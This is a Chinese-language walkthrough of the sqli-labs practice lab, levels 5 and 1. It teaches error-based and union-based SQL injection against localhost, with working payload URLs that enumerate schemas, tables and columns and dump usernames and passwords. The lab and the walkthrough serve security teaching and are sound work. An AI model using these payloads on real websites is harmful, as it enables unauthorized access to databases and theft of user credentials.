less-5

You are in………
这就是一种典型的基于布尔的SQL盲注
在这里就不能使用联合查询union select
就可以使用之前介绍的 left函数，然后一个一个试来爆出数据库的名称，然后通过报错注入报出表名和列名

正常来得到域名和表名时通过 union select 1,group concat(table_name),3 from information_schema.tables where table_schema=’security’
但在报错注入可以通过下列语句来报错注入结果没有返回值的问题
http://localhost/sqli-labs-master/Less-5/?id=1%27%20and%20extractvalue(null,concat(%27~%27,(select%20table_name%20from%20information_schema.tables%20where%20table_schema=%27security%27%20limit%200,1),%27~%27))--+
http://localhost/sqli-labs-master/Less-5/?id=1%27%20and%20extractvalue(null,concat(%27~%27,(select%20column_name%20from%20information_schema.columns%20where%20table_name=%27users%27%20limit%200,1),%27~%27))--+
得到了列名后就可以爆出数据了

第六关就是把单引号改成双引号就不多加讲述了

less-1详解

对第一关的详细讲解
SELECT * FROM users WHERE id=’1’ LIMIT 0,1
当输入?id=1时所对应的SQL语句如上
当在1后面加入了’后的SQL语句是：SELECT * FROM users WHERE id=’1’’ LIMIT 0,1
会出现报错，原因是多了一个’，用户输入的是1’，多出来的这个单引号会和前面的单引号进行闭合
‘ LIMIT 0,1 这一段是自动写进去的，直接将这段语句进行注释就可以解决报错
用–进行注释
单行注释中是用– 来注释（–后面有一个空格），但是直接输入–加一个空格不会有注释的效果，后台所展示的SQL中没有这个空格，那就只能通过其他的方式，最简单的方式在–后面加入一个+
+号在后台就被解释成了空格
此时的SQL语句就是：SELECT * FROM users WHERE id=’1’– ‘ LIMIT 0,1

=================================================================================
接下来使用”order by”进行判断字段个数
order by实际上是用来排序
asc是升序
desc是倒序
order by后面加数字几就是对第几列进行排序，从而实现判断字段个数

联合查询：可合并多个相似的选择查询的结果集。等同于将一个表追加到另一个表，从而实现将两个表的查询组合到一起，使用谓词为UNION或UNION ALL。
union select 用来报显示位，原因是左边查询没结果，右边结果1，2，3。就爆出了显示位。

sqli less1

先输入?id=1没有报错，然后输入?id=1’发现出现了报错,只要看见报错，就可以理解为这个注入已经确定了，因为我们多输了的
这个单引号最终最终在执行的sql的时候已经产生了注入。应为我们输入的1’已经当作参数进入数据库了，分号的确是是最终导致
数据库报错的根本原因
第一步，是查询是否存在注入
http://localhost/sqli-labs-master/Less-1/?id=1%27
第二步，接下来是思考如何让这个语句正常
http://localhost/sqli-labs-master/Less-1/?id=1%27--+
就是如上通过注释掉后面语句的方法。
第三步，是猜字段的数量，根据我们传入id最终查询到结果的列数
这里要用到一个MySQL的语法：”order by“
当输入http://localhost/sqli-labs-master/Less-1/?id=1%27 order by 1–+时不会出现错误，但当输入到order by 4 的时候就
会出现报错，就可以确定它的字段是三个
第四步，就是报出显示位，id就必须是查询不到的数据
http://localhost/sqli-labs-master/Less-1/?id=-1%27 union select 1,2,3–+
第五步，接下来就是查询详细信息
http://localhost/sqli-labs-master/Less-1/?id=-1%27%20union%20select%201,concat_ws(%27~%27,database(),version(),user()),3--+
查了当前数据库，数据库版本当前用户
第六步，查询具体，数据库
http://localhost/sqli-labs-master/Less-1/?id=-1%27%20union%20select%201,group_concat(schema_name),3%20from%20information_schema.schemata--+
这个语句将现有的所有数据库都查询出来了
然后要查询数据库所对应的表
http://localhost/sqli-labs-master/Less-1/?id=-1%27%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=%27security%27--+
接下来是查询表中的列
http://localhost/sqli-labs-master/Less-1/?id=-1%27%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name=%27users%27--+
查数据
注：0x3a代表一个冒号
http://localhost/sqli-labs-master/Less-1/?id=-1%27%20union%20select%201,group_concat(id,0x3a,username,0x3a,password),3%20from%20users--+

这样就分别爆出了库，表，字符段了
